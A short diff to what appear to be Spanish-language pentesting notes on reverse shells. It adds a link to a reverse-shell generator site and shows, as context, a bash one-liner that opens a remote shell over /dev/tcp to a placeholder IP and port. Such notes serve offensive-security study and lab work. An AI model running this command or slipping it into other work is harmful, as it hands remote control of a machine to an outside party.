@@ -110,6 +110,7 @@ REVERSE SHELL
 
 https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 https://deephacking.tech/reverse-shells-en-windows/
+https://www.revshells.com/
 
 si no funciona....
     1.creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
